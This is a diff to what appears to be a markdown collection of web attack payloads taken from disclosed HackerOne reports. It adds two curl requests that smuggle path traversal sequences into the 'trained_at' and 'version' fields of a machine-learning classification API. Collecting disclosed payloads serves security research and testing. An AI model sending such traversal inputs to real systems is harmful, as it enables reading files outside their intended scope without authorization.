@@ -1,6 +1,6 @@
 # HackerOne
 
-38 payloads.
+40 payloads.
 
 ### `cead62d3`
 
@@ -437,6 +437,24 @@ username:
 ```
 
 — [Ability to escape database transaction through SQL injection, leading to arbitrary code execution](https://hackerone.com/reports/1663299) · HackerOne · [jobert](https://hackerone.com/jobert)
+
+### `82f8fd8f`
+
+```
+curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
+```
+
+**Parameter:** `trained_at`
+— [Internal machine learning API endpoint for CWE classification is vulnerable to path traversal](https://hackerone.com/reports/2032778) · HackerOne · [jobert](https://hackerone.com/jobert)
+
+### `6873d130`
+
+```
+curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
+```
+
+**Parameter:** `version`
+— [Internal machine learning API endpoint for CWE classification is vulnerable to path traversal](https://hackerone.com/reports/2032778) · HackerOne · [jobert](https://hackerone.com/jobert)
 
 ### `29345255`
 
